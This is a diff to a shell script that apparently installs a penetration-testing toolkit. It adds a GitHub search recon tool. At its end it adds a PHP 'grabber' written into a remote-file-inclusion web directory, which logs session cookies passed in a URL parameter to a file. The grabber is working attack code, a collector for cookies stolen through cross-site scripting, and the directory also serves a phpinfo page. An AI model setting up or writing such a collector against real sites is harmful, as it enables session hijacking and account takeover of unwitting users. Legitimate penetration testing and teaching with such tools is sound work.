@@ -116,6 +116,11 @@ cd /opt/recon/massdns
 sudo make
 cd -
 
+sudo git clone https://github.com/gwen001/github-search.git /opt/recon/github-search
+cd /opt/recon/github-search
+sudo pip3 install -r requirements.txt
+cd -
+
 echo -e "${green}[+] Adding enum tools...${reset}"
 
 sudo git clone https://github.com/ticarpi/jwt_tool.git /opt/enum/jwt_tool
@@ -184,4 +189,14 @@ sudo ln -s /opt/powerless/Powerless.bat /srv/windows/pless.bat
 
 sudo mkdir /srv/rfi
 echo "<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>" | sudo tee /srv/rfi/phpinfo.php
+
+cat <<EOF | sudo tee /srv/rfi/grabber.php
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+?>
+EOF
+
 
